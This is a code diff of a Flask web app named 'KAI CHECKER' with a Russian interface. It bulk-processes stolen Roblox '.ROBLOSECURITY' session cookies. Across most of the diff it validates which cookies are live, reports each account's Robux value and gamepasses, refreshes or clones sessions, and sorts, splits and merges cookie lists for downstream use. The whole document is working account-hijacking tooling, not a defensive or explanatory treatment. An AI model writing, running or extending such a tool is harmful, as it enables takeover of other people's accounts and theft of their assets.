-</div>
+    <!-- ИНСТРУМЕНТЫ -->
+    <div class="tab-content" id="tab-tools">
+        <div class="card">
+            <h2>📂 Сортер (разбивает по одному в файл)</h2>
+            <div class="upload-area" id="sorterArea" onclick="document.getElementById('sorterFile').click()">
+                <p>📁 <strong>ЗАГРУЗИТЬ .TXT ФАЙЛ С КУКАМИ</strong></p>
+            </div>
+            <input type="file" id="sorterFile" accept=".txt" style="display:none;">
+            <button class="btn btn-primary" onclick="runSorter()">СОРТИРОВАТЬ</button>
+            <div class="result-box" id="sorterResult"></div>
+        </div>
 
-<!-- ПРОЧЕЕ -->
-<div class="tab-content" id="tab-other">
-<div class="card">
-<h2>🧹 Управление файлами</h2>
-<button class="btn" style="background: #ff3355; color: #fff;" onclick="clearOutput()">ОЧИСТИТЬ ПАПКУ OUTPUT</button>
-<div class="result-box" id="clearResult" style="margin-top:10px;"></div>
-</div>
-</div>
+        <div class="card">
+            <h2>✂️ Разделитель (делит на 5 частей)</h2>
+            <div class="upload-area" id="splitArea" onclick="document.getElementById('splitFile').click()">
+                <p>📁 <strong>ЗАГРУЗИТЬ .TXT ФАЙЛ С КУКАМИ</strong></p>
+            </div>
+            <input type="file" id="splitFile" accept=".txt" style="display:none;">
+            <button class="btn btn-primary" onclick="runSplit()">РАЗДЕЛИТЬ</button>
+            <div class="result-box" id="splitResult"></div>
+        </div>
 
-<div class="footer">KAI CHECKER v3.3 — WITH PLAYTIME & GAMEPASSES</div>
+        <div class="card">
+            <h2>📦 Слияние (объединяет несколько .txt, удаляет дубли)</h2>
+            <div class="upload-area" id="mergeArea" onclick="document.getElementById('mergeFile').click()">
+                <p>📁 <strong>ЗАГРУЗИТЬ НЕСКОЛЬКО .TXT ФАЙЛОВ</strong></p>
+            </div>
+            <input type="file" id="mergeFile" accept=".txt" multiple style="display:none;">
+            <button class="btn btn-primary" onclick="runMerge()">СЛИТЬ</button>
+            <div class="result-box" id="mergeResult"></div>
+        </div>
+    </div>
+
+    <div class="footer">KAI CHECKER — ВСЕ ФУНКЦИИ В ОДНОМ МЕСТЕ</div>
 </div>
 
 <script>
-document.querySelectorAll('.tab').forEach(tab => {
-tab.addEventListener('click', function() {
-document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-this.classList.add('active');
-document.getElementById('tab-' + this.dataset.tab).classList.add('active');
-});
-});
+    // ===== ВКЛАДКИ =====
+    document.querySelectorAll('.tab').forEach(tab => {
+        tab.addEventListener('click', function() {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            this.classList.add('active');
+            document.getElementById('tab-' + this.dataset.tab).classList.add('active');
+        });
+    });
 
-function initDropZone(areaId, inputId) {
-const area = document.getElementById(areaId);
-const input = document.getElementById(inputId);
-if (!area || !input) return;
-['dragenter','dragover','dragleave','drop'].forEach(eName => {
-area.addEventListener(eName, (e) => { e.preventDefault(); e.stopPropagation(); }, false);
-});
-['dragenter','dragover'].forEach(eName => {
-area.addEventListener(eName, () => area.classList.add('drag-active'), false);
-});
-['dragleave','drop'].forEach(eName => {
-area.addEventListener(eName, () => area.classList.remove('drag-active'), false);
-});
-area.addEventListener('drop', (e) => {
-const dt = e.dataTransfer;
-if (dt && dt.files.length > 0) {
-input.files = dt.files;
-showSelectedFile(area, dt.files[0]);
-}
-});
-input.addEventListener('change', () => {
-if (input.files.length > 0) showSelectedFile(area, input.files[0]);
-});
-}
+    // ===== DRAG & DROP =====
+    document.querySelectorAll('.upload-area').forEach(area => {
+        area.addEventListener('dragover', e => { e.preventDefault(); area.classList.add('drag-active'); });
+        area.addEventListener('dragleave', () => { area.classList.remove('drag-active'); });
+        area.addEventListener('drop', e => {
+            e.preventDefault();
+            area.classList.remove('drag-active');
+            const files = e.dataTransfer.files;
+            const input = area.parentElement.querySelector('input[type="file"]');
+            if (input) { input.files = files; input.dispatchEvent(new Event('change')); }
+        });
+    });
 
-function showSelectedFile(area, file) {
-const sizeKb = (file.size / 1024).toFixed(1);
-area.querySelector('p').innerHTML = `✅ <strong>ФАЙЛ ПОДГРУЖЕН:</strong> ${file.name} <span style="color:#888;">(${sizeKb} KB)</span>`;
-area.style.borderColor = '#00ff99';
-area.style.background = '#00ff9908';
-}
+    // ===== ЧЕКЕР =====
+    async function runFullcheck() {
+        const fileInput = document.getElementById('fullFile');
+        const resBox = document.getElementById('fullcheckResult');
+        if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
+        const formData = new FormData();
+        formData.append('file', fileInput.files[0]);
+        resBox.textContent = '⏳ Проверка...';
+        resBox.className = 'result-box';
+        try {
+            const r = await fetch('/api/fullcheck', { method: 'POST', body: formData });
+            const data = await r.json();
+            if (data.success) {
+                resBox.className = 'result-box success';
+                let html = `<span class="valid">✅ Проверено: ${data.total}</span>\n`;
+                html += `<span class="info">📦 Геймпассов: ${data.total_gamepasses}</span>\n`;
+                html += `<span class="info">💎 RAP: ${data.total_rap}</span>\n\n`;
+                if (data.reports) {
+                    html += `<b>📋 КРАТКИЕ ОТЧЁТЫ:</b>\n`;
+                    for (const report of data.reports) {
+                        html += `\n${report}\n─────────────────\n`;
+                    }
+                }
+                if (data.download_url) {
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ ПОЛНЫЕ ОТЧЁТЫ (ZIP)</a>`;
+                }
+                resBox.innerHTML = html;
+            } else {
+                resBox.className = 'result-box error';
+                resBox.textContent = data.message;
+            }
+        } catch (e) {
+            resBox.className = 'result-box error';
+            resBox.textContent = 'Ошибка: ' + e;
+        }
+    }
 
-document.addEventListener('DOMContentLoaded', () => {
-initDropZone('valArea', 'valFile');
-initDropZone('fullArea', 'fullFile');
-});
+    // ===== ФРЕШЕР =====
+    async function freshCookie() {
+        const input = document.getElementById('freshInput');
+        const resBox = document.getElementById('freshResult');
+        const cookie = input.value.trim();
+        if (!cookie) { resBox.textContent = '❌ Введите кук!'; resBox.className = 'result-box error'; return; }
+        resBox.textContent = '⏳ Обновление...';
+        resBox.className = 'result-box';
+        try {
+            const r = await fetch('/api/fresh', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cookie })
+            });
+            const data = await r.json();
+            if (data.success) {
+                resBox.className = 'result-box success';
+                resBox.innerHTML = `<span class="valid">✅ Обновлено!</span>\n<code>${data.new_cookie}</code>`;
+            } else {
+                resBox.className = 'result-box error';
+                resBox.textContent = '❌ ' + data.log;
+            }
+        } catch (e) {
+            resBox.className = 'result-box error';
+            resBox.textContent = 'Ошибка: ' + e;
+        }
+    }
 
-async function clearOutput() {
-if (!confirm('Удалить все файлы из папки output?')) return;
-const res = document.getElementById('clearResult');
-try {
-const response = await fetch('/api/clear-output', { method: 'POST' });
-const data = await response.json();
-res.className = data.success ? 'result-box success' : 'result-box error';
-res.textContent = data.message;
-} catch (e) {
-res.className = 'result-box error';
-res.textContent = 'Ошибка: ' + e;
-}
-}
+    // ===== ВАЛИДАТОР =====
+    async function runValidator() {
+        const fileInput = document.getElementById('validatorFile');
+        const resBox = document.getElementById('validatorResult');
+        if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
+        const formData = new FormData();
+        formData.append('file', fileInput.files[0]);
+        resBox.textContent = '⏳ Валидация...';
+        resBox.className = 'result-box';
+        try {
+            const r = await fetch('/api/validate', { method: 'POST', body: formData });
+            const data = await r.json();
+            if (data.success) {
+                resBox.className = 'result-box success';
+                let html = `<span class="valid">✅ Валидных: ${data.valid}</span>\n`;
+                html += `<span class="invalid">❌ Невалидных: ${data.invalid}</span>\n`;
+                html += `<span class="info">📊 Всего: ${data.total}</span>`;
+                if (data.download_url) {
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ ВАЛИДНЫЕ</a>`;
+                }
+                resBox.innerHTML = html;
+            } else {
+                resBox.className = 'result-box error';
+                resBox.textContent = data.message;
+            }
+        } catch (e) {
+            resBox.className = 'result-box error';
+            resBox.textContent = 'Ошибка: ' + e;
+        }
+    }
 
-async function runValidator() {
-const fileInput = document.getElementById('valFile');
-const resBox = document.getElementById('validatorResult');
-if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
-const formData = new FormData();
-formData.append('file', fileInput.files[0]);
-resBox.textContent = '⏳ Проверка...';
-resBox.className = 'result-box';
-try {
-const r = await fetch('/api/validate', { method: 'POST', body: formData });
-const data = await r.json();
-resBox.className = data.success ? 'result-box success' : 'result-box error';
-if (data.download_url) {
-resBox.innerHTML = data.message + `<br><a href="${data.download_url}" class="btn btn-success">📥 СКАЧАТЬ ВАЛИДНЫЕ</a>`;
-} else {
-resBox.textContent = data.message;
-}
-} catch (e) {
-resBox.className = 'result-box error';
-resBox.textContent = 'Ошибка: ' + e;
-}
-}
+    // ===== СОРТЕР =====
+    async function runSorter() {
+        const fileInput = document.getElementById('sorterFile');
+        const resBox = document.getElementById('sorterResult');
+        if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
+        const formData = new FormData();
+        formData.append('file', fileInput.files[0]);
+        resBox.textContent = '⏳ Сортировка...';
+        resBox.className = 'result-box';
+        try {
+            const r = await fetch('/api/sorter', { method: 'POST', body: formData });
+            const data = await r.json();
+            if (data.success) {
+                resBox.className = 'result-box success';
+                let html = `<span class="valid">✅ Сортировка завершена!</span>\n`;
+                html += `<span class="info">📦 Куков: ${data.total}</span>`;
+                if (data.download_url) {
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ ZIP</a>`;
+                }
+                resBox.innerHTML = html;
+            } else {
+                resBox.className = 'result-box error';
+                resBox.textContent = data.message;
+            }
+        } catch (e) {
+            resBox.className = 'result-box error';
+            resBox.textContent = 'Ошибка: ' + e;
+        }
+    }
 
-async function runFullcheck() {
-const fileInput = document.getElementById('fullFile');
-const resBox = document.getElementById('fullcheckResult');
-const format = document.querySelector('input[name="reportFormat"]:checked').value;
-if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
-const formData = new FormData();
-formData.append('file', fileInput.files[0]);
-formData.append('format', format);
-resBox.textContent = '⏳ Анализ...';
-resBox.className = 'result-box';
-try {
-const r = await fetch('/api/fullcheck', { method: 'POST', body: formData });
-const data = await r.json();
-if (data.success) {
-resBox.className = 'result-box success';
-let html = `✅ Анализ завершен! Обработано: ${data.total}\n`;
-if (data.download_url) {
-html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ ОТЧЕТ</a>`;
-}
-resBox.innerHTML = html;
-} else {
-resBox.className = 'result-box error';
-resBox.textContent = data.message;
-}
-} catch (e) {
-resBox.className = 'result-box error';
-resBox.textContent = 'Ошибка: ' + e;
-}
-}
+    // ===== РАЗДЕЛИТЕЛЬ =====
+    async function runSplit() {
+        const fileInput = document.getElementById('splitFile');
+        const resBox = document.getElementById('splitResult');
+        if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
+        const formData = new FormData();
+        formData.append('file', fileInput.files[0]);
+        resBox.textContent = '⏳ Разделение...';
+        resBox.className = 'result-box';
+        try {
+            const r = await fetch('/api/split', { method: 'POST', body: formData });
+            const data = await r.json();
+            if (data.success) {
+                resBox.className = 'result-box success';
+                let html = `<span class="valid">✅ Разделение завершено!</span>\n`;
+                html += `<span class="info">📦 Куков: ${data.total}</span>`;
+                if (data.download_url) {
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ ZIP</a>`;
+                }
+                resBox.innerHTML = html;
+            } else {
+                resBox.className = 'result-box error';
+                resBox.textContent = data.message;
+            }
+        } catch (e) {
+            resBox.className = 'result-box error';
+            resBox.textContent = 'Ошибка: ' + e;
+        }
+    }
 
-async function freshCookie() {
-const cookie = document.getElementById('freshInput').value.trim();
-const resBox = document.getElementById('freshResult');
-if (!cookie) { alert('Введите кук!'); return; }
-resBox.textContent = '⏳ Обновление...';
-resBox.className = 'result-box';
-try {
-const r = await fetch('/api/refresh', {
-method: 'POST',
-headers: {'Content-Type': 'application/json'},
-body: JSON.stringify({cookie: cookie, kill: true})
-});
-const data = await r.json();
-if (data.success) {
-resBox.className = 'result-box success';
-resBox.innerHTML = `✅ Обновлено!<br><code>${data.new_cookie}</code>`;
-} else {
-resBox.className = 'result-box error';
-resBox.textContent = data.message;
-}
-} catch (e) {
-resBox.className = 'result-box error';
-resBox.textContent = 'Ошибка: ' + e;
-}
-}
-
-async function duplicateCookie() {
-const cookie = document.getElementById('duplicateInput').value.trim();
-const resBox = document.getElementById('duplicateResult');
-if (!cookie) { alert('Введите кук!'); return; }
-resBox.textContent = '⏳ Клонирование...';
-resBox.className = 'result-box';
-try {
-const r = await fetch('/api/refresh', {
-method: 'POST',
-headers: {'Content-Type': 'application/json'},
-body: JSON.stringify({cookie: cookie, kill: false})
-});
-const data = await r.json();
-if (data.success) {
-resBox.className = 'result-box success';
-resBox.innerHTML = `✅ Клон создан!<br><code>${data.new_cookie}</code>`;
-} else {
-resBox.className = 'result-box error';
-resBox.textContent = data.message;
-}
-} catch (e) {
-resBox.className = 'result-box error';
-resBox.textContent = 'Ошибка: ' + e;
-}
-}
-
-async function loadHistory() {
-const container = document.getElementById('historyList');
-container.innerHTML = '<p style="color:#888;">Загрузка...</p>';
-try {
-const r = await fetch('/api/history');
-const history = await r.json();
-if (!history.length) {
-container.innerHTML = '<p style="color:#666;">История пуста.</p>';
-return;
-}
-let html = '';
-history.forEach(item => {
-html += `<div class="history-item">
-<div><span style="color:#00ff99;">[${item.type}]</span> ${item.details}</div>
-<div style="color:#666; font-size:12px;">${item.date}</div>
-</div>`;
-});
-container.innerHTML = html;
-} catch (e) {
-container.innerHTML = '<p style="color:#ff3355;">Ошибка загрузки.</p>';
-}
-}
+    // ===== СЛИЯНИЕ =====
+    async function runMerge() {
+        const fileInput = document.getElementById('mergeFile');
+        const resBox = document.getElementById('mergeResult');
+        if (fileInput.files.length < 2) { alert('Выберите минимум 2 файла!'); return; }
+        const formData = new FormData();
+        for (let f of fileInput.files) {
+            formData.append('files', f);
+        }
+        resBox.textContent = '⏳ Слияние...';
+        resBox.className = 'result-box';
+        try {
+            const r = await fetch('/api/merge', { method: 'POST', body: formData });
+            const data = await r.json();
+            if (data.success) {
+                resBox.className = 'result-box success';
+                let html = `<span class="valid">✅ Слияние завершено!</span>\n`;
+                html += `<span class="info">📦 Куков: ${data.total}</span>\n`;
+                html += `<span class="valid">🔄 Дублей удалено: ${data.duplicates}</span>`;
+                if (data.download_url) {
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ</a>`;
+                }
+                resBox.innerHTML = html;
+            } else {
+                resBox.className = 'result-box error';
+                resBox.textContent = data.message;
+            }
+        } catch (e) {
+            resBox.className = 'result-box error';
+            resBox.textContent = 'Ошибка: ' + e;
+        }
+    }
 </script>
 </body>
 </html>
 """
 
 # ============================================================
-# API РОУТЫ
+# API
 # ============================================================
 
 @app.route("/")
 def index():
-    return render_template_string(HTML_TEMPLATE)
+    return render_template_string(HTML)
 
-@app.route("/api/validate", methods=["POST"])
-def api_validate():
-    if 'file' not in request.files:
-        return jsonify({"success": False, "message": "Файл не найден"})
-    file = request.files['file']
-    content = file.read().decode('utf-8', errors='ignore')
-    cookies = extract_cookies(content)
-    if not cookies:
-        return jsonify({"success": False, "message": "Куки не обнаружены"})
-    
-    valid = []
-    invalid = []
-    for c in cookies[:50]:
-        s = create_session(c)
-        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=3, verify=False)
-        if r.status_code == 200:
-            valid.append(c)
-        else:
-            invalid.append(c)
-    
-    save_history("VALIDATOR", f"Проверено: {len(cookies)} | Валидных: {len(valid)}")
-    
-    if valid:
-        filename = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        filepath = os.path.join("output", filename)
-        with open(filepath, 'w', encoding='utf-8') as f:
-            f.write('\n'.join(valid))
-        return jsonify({
-            "success": True,
-            "message": f"✅ Проверка завершена!\nВсего: {len(cookies)}\nВалидных: {len(valid)}\nНевалидных: {len(invalid)}",
-            "download_url": f"/download/{filename}"
-        })
-    
-    return jsonify({"success": True, "message": f"Валидных куков не найдено. Всего: {len(cookies)}"})
-
+# ===== ЧЕКЕР =====
 @app.route("/api/fullcheck", methods=["POST"])
 def api_fullcheck():
     if 'file' not in request.files:
         return jsonify({"success": False, "message": "Файл не найден"})
     
     file = request.files['file']
-    fmt = request.form.get('format', 'zip')
     content = file.read().decode('utf-8', errors='ignore')
-    cookies = extract_cookies(content)
+    
+    cookies = []
+    for line in content.split('\n'):
+        line = line.strip()
+        if '_|WARNING' in line and len(line) > 100:
+            cookies.append(line)
+        elif '.ROBLOSECURITY' in line and len(line) > 100:
+            cookies.append(line)
     
     if not cookies:
         return jsonify({"success": False, "message": "Куки не найдены"})
     
     reports_data = []
+    total_gamepasses = 0
+    total_rap = 0
+    short_reports = []
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     
-    for c in cookies:
+    for c in cookies[:10]:
         info = get_full_info(c)
         if info['status'] == '✅':
             reports_data.append(info)
-
+            total_gamepasses += len(info.get('PurchasedGamepasses', {}))
+            total_rap += info.get('TotalRAP', 0)
+            short_reports.append(format_short_report(info))
+    
     if not reports_data:
         return jsonify({"success": False, "message": "Нет валидных аккаунтов"})
-
-    if fmt == 'zip':
-        zip_filename = f"kai_reports_{timestamp}.zip"
-        zip_path = os.path.join("output", zip_filename)
-        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-            for idx, r in enumerate(reports_data):
-                txt_content = generate_txt_report(r)
-                username = r.get('Username', f'account_{idx+1}')
-                safe_name = re.sub(r'[<>:"/\\|?*]', '_', username)
-                zf.writestr(f"{safe_name}_{r.get('UserID', idx+1)}.txt", txt_content)
-        output_path = zip_path
-        output_filename = zip_filename
-    elif fmt == 'html':
-        output_filename = f"kai_report_{timestamp}.html"
-        output_path = os.path.join("output", output_filename)
-        html_content = "\n<hr>\n".join([generate_html_report(r) for r in reports_data])
-        with open(output_path, 'w', encoding='utf-8') as f:
-            f.write(html_content)
-    elif fmt == 'csv':
-        output_filename = f"kai_report_{timestamp}.csv"
-        output_path = os.path.join("output", output_filename)
-        csv_content = generate_csv_data(reports_data)
-        with open(output_path, 'w', encoding='utf-8') as f:
-            f.write(csv_content)
-    else:
-        # По умолчанию ZIP
-        zip_filename = f"kai_reports_{timestamp}.zip"
-        zip_path = os.path.join("output", zip_filename)
-        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-            for idx, r in enumerate(reports_data):
-                txt_content = generate_txt_report(r)
-                username = r.get('Username', f'account_{idx+1}')
-                safe_name = re.sub(r'[<>:"/\\|?*]', '_', username)
-                zf.writestr(f"{safe_name}_{r.get('UserID', idx+1)}.txt", txt_content)
-        output_path = zip_path
-        output_filename = zip_filename
-
-    save_history("FULLCHECK", f"Проверено: {len(reports_data)} | Формат: {fmt}")
+    
+    zip_buffer = BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for info in reports_data:
+            zf.writestr(f"{info.get('Username', 'account')}.txt", generate_full_txt_report(info))
+    zip_buffer.seek(0)
+    
+    filename = f"full_reports_{timestamp}.zip"
+    with open(f"downloads/{filename}", 'wb') as f:
+        f.write(zip_buffer.getvalue())
+    
     return jsonify({
         "success": True,
-        "total": len(reports_data),
-        "download_url": f"/download/{os.path.basename(output_path)}"
+        "total": len(cookies),
+        "total_gamepasses": total_gamepasses,
+        "total_rap": total_rap,
+        "reports": short_reports,
+        "download_url": f"/downloads/{filename}"
     })
 
-@app.route("/download/<filename>")
-def download_file(filename):
-    return send_file(os.path.join("output", filename), as_attachment=True)
+# ===== ФРЕШЕР =====
+@app.route("/api/fresh", methods=["POST"])
+def api_fresh():
+    data = request.json
+    cookie = data.get('cookie', '')
+    ok, new_cookie, log_text = refresh_cookie_sync(cookie)
+    return jsonify({"success": ok, "new_cookie": new_cookie, "log": log_text})
 
-@app.route("/api/refresh", methods=["POST"])
-def api_refresh():
-    data = request.json or {}
-    cookie = data.get("cookie", "").strip()
-    kill = data.get("kill", True)
-    if not cookie:
-        return jsonify({"success": False, "message": "Кук не передан"})
+# ===== ВАЛИДАТОР =====
+@app.route("/api/validate", methods=["POST"])
+def api_validate():
+    if 'file' not in request.files:
+        return jsonify({"success": False, "message": "Файл не найден"})
+    file = request.files['file']
+    content = file.read().decode('utf-8', errors='ignore')
     
-    success, new_cookie, log = refresh_cookie_sync(cookie, kill)
-    if success:
-        save_history("FRESHER" if kill else "DUPLICATOR", "Успешно обновлен/клонирован кук")
-        return jsonify({"success": True, "new_cookie": new_cookie, "log": log})
-    else:
-        return jsonify({"success": False, "message": log})
+    cookies = []
+    for line in content.split('\n'):
+        line = line.strip()
+        if '_|WARNING' in line and len(line) > 100:
+            cookies.append(line)
+        elif '.ROBLOSECURITY' in line and len(line) > 100:
+            cookies.append(line)
+    
+    if not cookies:
+        return jsonify({"success": False, "message": "Куки не найдены"})
+    
+    valid = []
+    invalid = []
+    for c in cookies[:20]:
+        info = get_full_info(c)
+        if info['status'] == '✅':
+            valid.append(c)
+        else:
+            invalid.append(c)
+    
+    if valid:
+        filename = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        with open(f"downloads/{filename}", 'w', encoding='utf-8') as f:
+            f.write('\n'.join(valid))
+        return jsonify({
+            "success": True,
+            "total": len(cookies),
+            "valid": len(valid),
+            "invalid": len(invalid),
+            "download_url": f"/downloads/{filename}"
+        })
+    
+    return jsonify({
+        "success": True,
+        "total": len(cookies),
+        "valid": 0,
+        "invalid": len(cookies)
+    })
 
-@app.route("/api/history", methods=["GET"])
-def api_history():
-    if os.path.exists(HISTORY_FILE):
-        try:
-            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
-                return jsonify(json.load(f))
-        except Exception:
-            return jsonify([])
-    return jsonify([])
+# ===== СОРТЕР =====
+@app.route("/api/sorter", methods=["POST"])
+def api_sorter():
+    if 'file' not in request.files:
+        return jsonify({"success": False, "message": "Файл не найден"})
+    file = request.files['file']
+    content = file.read().decode('utf-8', errors='ignore')
+    
+    cookies = []
+    for line in content.split('\n'):
+        line = line.strip()
+        if '_|WARNING' in line and len(line) > 100:
+            cookies.append(line)
+        elif '.ROBLOSECURITY' in line and len(line) > 100:
+            cookies.append(line)
+    
+    if not cookies:
+        return jsonify({"success": False, "message": "Куки не найдены"})
+    
+    zip_buffer = BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for i, cookie in enumerate(cookies[:50]):
+            zf.writestr(f"cookie_{i+1}.txt", cookie)
+    zip_buffer.seek(0)
+    
+    filename = f"sorted_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+    with open(f"downloads/{filename}", 'wb') as f:
+        f.write(zip_buffer.getvalue())
+    
+    return jsonify({
+        "success": True,
+        "total": len(cookies),
+        "download_url": f"/downloads/{filename}"
+    })
 
-@app.route("/api/clear-output", methods=["POST"])
-def api_clear_output():
-    try:
-        count = 0
-        for f in os.listdir("output"):
-            fp = os.path.join("output", f)
-            if os.path.isfile(fp):
-                os.remove(fp)
-                count += 1
-        return jsonify({"success": True, "message": f"✅ Удалено файлов: {count}"})
-    except Exception as e:
-        return jsonify({"success": False, "message": f"Ошибка: {str(e)}"})
+# ===== РАЗДЕЛИТЕЛЬ =====
+@app.route("/api/split", methods=["POST"])
+def api_split():
+    if 'file' not in request.files:
+        return jsonify({"success": False, "message": "Файл не найден"})
+    file = request.files['file']
+    content = file.read().decode('utf-8', errors='ignore')
+    
+    cookies = []
+    for line in content.split('\n'):
+        line = line.strip()
+        if '_|WARNING' in line and len(line) > 100:
+            cookies.append(line)
+        elif '.ROBLOSECURITY' in line and len(line) > 100:
+            cookies.append(line)
+    
+    if not cookies:
+        return jsonify({"success": False, "message": "Куки не найдены"})
+    
+    parts = 5
+    chunk_size = max(1, len(cookies) // parts)
+    chunks = [cookies[i:i+chunk_size] for i in range(0, len(cookies), chunk_size)]
+    
+    zip_buffer = BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for i, chunk in enumerate(chunks[:5]):
+            zf.writestr(f"part_{i+1}.txt", '\n'.join(chunk))
+    zip_buffer.seek(0)
+    
+    filename = f"split_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+    with open(f"downloads/{filename}", 'wb') as f:
+        f.write(zip_buffer.getvalue())
+    
+    return jsonify({
+        "success": True,
+        "total": len(cookies),
+        "download_url": f"/downloads/{filename}"
+    })
+
+# ===== СЛИЯНИЕ =====
+@app.route("/api/merge", methods=["POST"])
+def api_merge():
+    if 'files' not in request.files:
+        return jsonify({"success": False, "message": "Файлы не загружены"})
+    files = request.files.getlist('files')
+    if len(files) < 2:
+        return jsonify({"success": False, "message": "Минимум 2 файла"})
+    
+    all_cookies = []
+    filenames = []
+    for f in files:
+        content = f.read().decode('utf-8', errors='ignore')
+        filenames.append(f.filename)
+        for line in content.split('\n'):
+            line = line.strip()
+            if '_|WARNING' in line and len(line) > 100:
+                all_cookies.append(line)
+            elif '.ROBLOSECURITY' in line and len(line) > 100:
+                all_cookies.append(line)
+    
+    if not all_cookies:
+        return jsonify({"success": False, "message": "Куки не найдены"})
+    
+    unique_cookies = list(dict.fromkeys(all_cookies))
+    
+    filename = f"merged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    with open(f"downloads/{filename}", 'w', encoding='utf-8') as f:
+        f.write('\n'.join(unique_cookies))
+    
+    return jsonify({
+        "success": True,
+        "merged": len(files),
+        "total": len(unique_cookies),
+        "duplicates": len(all_cookies) - len(unique_cookies),
+        "download_url": f"/downloads/{filename}"
+    })
+
+@app.route("/downloads/<filename>")
+def download_file(filename):
+    return send_from_directory("downloads", filename, as_attachment=True)
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(debug=False, host='0.0.0.0', port=port)
+    app.run(debug=True, port=5000)
